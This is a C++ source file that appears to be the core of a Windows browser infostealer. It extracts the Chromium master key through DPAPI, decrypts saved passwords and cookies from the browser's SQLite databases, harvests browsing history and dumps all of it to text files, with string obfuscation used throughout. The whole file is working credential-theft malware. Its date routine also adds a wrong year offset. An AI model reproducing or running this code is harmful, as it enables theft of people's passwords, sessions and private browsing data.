#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <iterator>
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <filesystem>
#include <fstream>
#include <map>
#include <regex>
#include <set>

#include <openssl/aes.h>
#include <openssl/evp.h>
#include "sqlite/sqlite3.h"

#include "no_string.hpp"

std::string ReadFileToString(const std::filesystem::path &filePath)
{

    std::ifstream file(filePath);

    if (file.is_open())
    {
        std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        return fileContents;
    }
    else
    {
        return enc("failed");
    }
}

std::vector<uint8_t> base64Decode(const std::string &input)
{

    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::vector<uint8_t> output;
    int bits_collected = 0;
    unsigned int accumulator = 0;

    for (char c : input)
    {
        if (std::isspace(c))
            continue;
        if (c == '=')
            break;

        auto it = std::find(base64_chars.begin(), base64_chars.end(), c);
        if (it == base64_chars.end())
        {
            return std::vector<uint8_t>();
        }
        uint8_t value = static_cast<uint8_t>(std::distance(base64_chars.begin(), it));

        accumulator = (accumulator << 6) | value;
        bits_collected += 6;

        if (bits_collected >= 8)
        {
            bits_collected -= 8;
            output.push_back(static_cast<uint8_t>((accumulator >> bits_collected) & 0xFF));
        }
    }

    return output;
}

std::vector<uint8_t> cryptUnprotectData(const std::vector<uint8_t> &input)
{
    DATA_BLOB inputData;
    inputData.pbData = const_cast<BYTE *>(input.data());
    inputData.cbData = static_cast<DWORD>(input.size());
    DATA_BLOB outputData;

    if (!CryptUnprotectData(
            &inputData,
            nullptr,
            nullptr,
            nullptr,
            nullptr,
            0,
            &outputData))
    {
        return std::vector<uint8_t>();
    }

    std::vector<uint8_t> decrypted(outputData.pbData, outputData.pbData + outputData.cbData);
    LocalFree(outputData.pbData);

    return decrypted;
}

std::string decryptPassword(const std::vector<uint8_t> &buff, const std::vector<uint8_t> &masterKey)
{
    uint8_t iv[12];
    memcpy(iv, buff.data() + 3, 12);

    uint8_t *payload = new uint8_t[buff.size() - 15];
    memcpy(payload, buff.data() + 15, buff.size() - 15);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, masterKey.data(), iv);

    int len;
    uint8_t *decryptedPass = new uint8_t[buff.size()];
    EVP_DecryptUpdate(ctx, decryptedPass, &len, payload, buff.size() - 15);

    int decryptedLen;
    EVP_DecryptFinal_ex(ctx, decryptedPass + len, &decryptedLen);
    len += decryptedLen;

    std::string decryptedPassStr(reinterpret_cast<const char *>(decryptedPass), len - 16);

    EVP_CIPHER_CTX_free(ctx);
    delete[] decryptedPass;
    delete[] payload;

    return decryptedPassStr;
}

std::string formatTimestamp(const std::string &timestamp)
{
    // Convert the timestamp to a numeric value
    long long timestampValue = std::stoll(timestamp);

    // Convert the timestamp to a time_t value
    time_t timeValue = static_cast<time_t>(timestampValue / 1000000);

    // Convert the time_t value to a tm structure
    struct tm *timeinfo = std::gmtime(&timeValue);

    // Format the date as day/month/year
    std::stringstream ss;
    ss << std::setw(2) << std::setfill('0') << timeinfo->tm_mday << "/"
       << std::setw(2) << std::setfill('0') << (timeinfo->tm_mon + 1) << "/"
       << (timeinfo->tm_year + 1531);

    return ss.str();
}

struct Login
{
    std::string origin_url;
    std::string username_value;
    std::string password_value;
    std::string date_created;
};

std::vector<Login> getLoginData(const std::filesystem::path &path, const std::vector<uint8_t> &masterKey)
{
    std::filesystem::path loginDb = path / enc("Login Data");
    if (!std::filesystem::exists(loginDb))
    {
        return std::vector<Login>();
    }

    std::filesystem::copy_file(loginDb, enc("login_db"), std::filesystem::copy_options::overwrite_existing);

    sqlite3 *db;
    int result = sqlite3_open_v2(enc("login_db").c_str(), &db, SQLITE_OPEN_READONLY, nullptr);
    if (result != SQLITE_OK)
    {
        return std::vector<Login>();
    }

    std::vector<Login> logins;

    sqlite3_stmt *stmt;
    result = sqlite3_prepare_v2(db, enc("SELECT origin_url, username_value, password_value, date_created FROM logins").c_str(), -1, &stmt, nullptr);

    if (result != SQLITE_OK)
    {
        sqlite3_close(db);
        std::filesystem::remove(enc("login_db"));
        return logins;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW)
    {
        // Retrieve other columns
        std::string originUrl(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0)));
        std::string usernameValue(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1)));
        std::vector<uint8_t> passwordValueBlob(
            static_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2)),
            static_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2)) + sqlite3_column_bytes(stmt, 2));
        std::string timestamp(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 3)));

        if (originUrl.empty() || usernameValue.empty() || passwordValueBlob.empty())
        {
            continue;
        }

        std::string password = decryptPassword(passwordValueBlob, masterKey);
        std::string formattedDate = formatTimestamp(timestamp);

        logins.push_back({originUrl, usernameValue, password, formattedDate});
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    std::filesystem::remove(enc("login_db"));

    return logins;
}

struct Cookie
{
    std::string host_key;
    std::string name;
    std::string encrypted_value;
    std::string expires_utc;
};

std::vector<Cookie> getCookies(const std::filesystem::path &path, const std::vector<uint8_t> &masterKey)
{
    const std::filesystem::path cookieDb = path / enc("Network") / enc("Cookies");
    if (!std::filesystem::exists(cookieDb))
    {
        return std::vector<Cookie>();
    }

    std::filesystem::copy_file(cookieDb, enc("cookie_db"), std::filesystem::copy_options::overwrite_existing);

    sqlite3 *db;
    int result = sqlite3_open_v2(enc("cookie_db").c_str(), &db, SQLITE_OPEN_READONLY, nullptr);
    if (result != SQLITE_OK)
    {
        return std::vector<Cookie>();
    }

    std::vector<Cookie> cookies;

    sqlite3_stmt *stmt;
    result = sqlite3_prepare_v2(db, enc("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").c_str(), -1, &stmt, nullptr);

    if (result != SQLITE_OK)
    {
        sqlite3_close(db);
        std::filesystem::remove(enc("cookie_db"));
        return cookies;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW)
    {
        // Retrieve other columns
        std::string host_key(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0)));
        std::string name(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1)));
        std::vector<uint8_t> encryptedValueBlob(
            static_cast<const uint8_t *>(sqlite3_column_blob(stmt, 3)),
            static_cast<const uint8_t *>(sqlite3_column_blob(stmt, 3)) + sqlite3_column_bytes(stmt, 3));
        std::string expires_utc(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 4)));

        if (host_key.empty() || name.empty() || encryptedValueBlob.empty())
        {
            continue;
        }

        std::string cookie = decryptPassword(encryptedValueBlob, masterKey);
        std::string expired_date = formatTimestamp(expires_utc);
        cookies.push_back({host_key, name, cookie, expired_date});
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    std::filesystem::remove(enc("cookie_db"));

    return cookies;
}

struct WebHistory
{
    std::string url;
    std::string title;
    std::string last_visit_time;
};

std::vector<WebHistory> getHistory(const std::filesystem::path &path)
{
    const std::filesystem::path webHistoryDb = path / enc("History");
    if (!std::filesystem::exists(webHistoryDb))
    {
        return std::vector<WebHistory>();
    }

    std::filesystem::copy_file(webHistoryDb, enc("web_history_db"), std::filesystem::copy_options::overwrite_existing);

    sqlite3 *db;
    int result = sqlite3_open_v2(enc("web_history_db").c_str(), &db, SQLITE_OPEN_READONLY, nullptr);
    if (result != SQLITE_OK)
    {
        return std::vector<WebHistory>();
    }

    std::vector<WebHistory> webHistory;

    sqlite3_stmt *stmt;
    result = sqlite3_prepare_v2(db, enc("SELECT url, title, last_visit_time FROM urls").c_str(), -1, &stmt, nullptr);

    if (result != SQLITE_OK)
    {
        sqlite3_close(db);
        std::filesystem::remove(enc("web_history_db"));
        return webHistory;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW)
    {
        // Retrieve other columns
        std::string url(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0)));
        std::string title(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1)));
        std::string last_visit_time(reinterpret_cast<const char *>(sqlite3_column_text(stmt, 2)));

        if (url.empty() || title.empty() || last_visit_time.empty())
        {
            continue;
        }

        webHistory.push_back({url, title, formatTimestamp(last_visit_time)});
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    std::filesystem::remove(enc("web_history_db"));

    return webHistory;
}

std::vector<uint8_t> GetBrowserMasterKey(const std::filesystem::path &filepath)
{
    std::string filecontent = ReadFileToString(filepath / enc("Local State"));
    if (filecontent == enc("failed"))
        return {};

    size_t encrypted_key_start = filecontent.find(enc("\"encrypted_key\":\"")) + 17;
    if (encrypted_key_start == std::string::npos)
        return {};
    size_t encrypted_key_end = filecontent.find(enc("\"}"), encrypted_key_start + 1);

    std::string encrypted_key = filecontent.substr(encrypted_key_start, encrypted_key_end - encrypted_key_start);

    std::vector<uint8_t> masterKey = base64Decode(encrypted_key);

    masterKey = std::vector<uint8_t>(masterKey.begin() + 5, masterKey.end());
    masterKey = cryptUnprotectData(masterKey);

    return masterKey;
}

void WriteLoginsToFile(const std::filesystem::path &filePath, std::vector<Login> logins)
{
    std::ofstream outputFile(filePath / enc("logins.txt"));
    if (outputFile.is_open())
    {
        for (Login tmp : logins)
        {
            outputFile << tmp.date_created << "\n"
                       << tmp.origin_url << "\n"
                       << tmp.username_value << "\n"
                       << tmp.password_value << "\n\n";
        }
        outputFile.close();
    }
}

void WriteCookiesToFile(const std::filesystem::path &filePath, std::vector<Cookie> cookies)
{
    std::ofstream outputFile(filePath / enc("cookies.txt"));
    if (outputFile.is_open())
    {
        for (Cookie tmp : cookies)
        {
            outputFile << enc("Expired date: ") << tmp.expires_utc << "\n"
                       << tmp.host_key << "\n"
                       << tmp.name << "\n"
                       << tmp.encrypted_value << "\n\n";
        }
        outputFile.close();
    }
}

void WriteHistoriesToFile(const std::filesystem::path &filePath, std::vector<WebHistory> histories)
{
    std::ofstream outputFile(filePath / enc("histories.txt"));
    if (outputFile.is_open())
    {
        for (WebHistory tmp : histories)
        {
            outputFile << tmp.last_visit_time << "\n"
                       << tmp.url << "\n\n";
        }
        outputFile.close();
    }
}